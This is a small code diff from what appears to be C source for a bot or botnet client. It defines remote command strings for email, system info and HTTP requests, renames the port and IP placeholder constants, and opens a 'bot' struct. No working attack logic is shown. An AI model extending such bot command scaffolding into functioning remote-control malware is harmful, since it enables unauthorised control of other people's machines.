@@ -44,8 +44,8 @@
 #define EMAIL "email\n"
 #define SYS_INFO "sys_info\n"
 #define HTTP_REQ "http_req\n"
-#define C_PORT "C_PORT"
-#define C_IP "C_IP"
+#define C_PORT "PORT"
+#define C_IP "IP"
 
 typedef struct bot
 {
